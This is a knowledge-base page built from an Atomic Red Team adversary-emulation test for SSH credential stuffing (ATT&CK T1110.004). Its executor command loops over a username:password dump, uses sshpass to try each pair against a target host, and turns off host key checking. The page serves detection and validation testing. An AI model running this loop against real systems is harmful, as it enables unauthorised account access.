---
atomic_guid: "a790d50e-7ebf-48de-8daa-d9367e0911d4"
title: "SSH Credential Stuffing From FreeBSD"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.004"
attack_technique_name: "Brute Force: Credential Stuffing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/T1110.004.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "a790d50e-7ebf-48de-8daa-d9367e0911d4"
  - "SSH Credential Stuffing From FreeBSD"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# SSH Credential Stuffing From FreeBSD

Using username,password combination from a password dump to login over SSH.

## Metadata

- Atomic GUID: a790d50e-7ebf-48de-8daa-d9367e0911d4
- Technique: T1110.004: Brute Force: Credential Stuffing
- Platforms: linux
- Executor: sh
- Elevation Required: False
- Dependency Executor: sh
- Source Path: atomics/T1110.004/T1110.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.004]]

## Input Arguments

### target_host

- description: IP Address / Hostname you want to target.
- type: string
- default: localhost

## Dependencies

Requires SSHPASS

### Prerequisite Check

```bash
if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```bash
pkg install -y sshpass
```

## Executor

- elevation_required: False
- name: sh

### Command

```bash
cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/T1110.004.yaml)
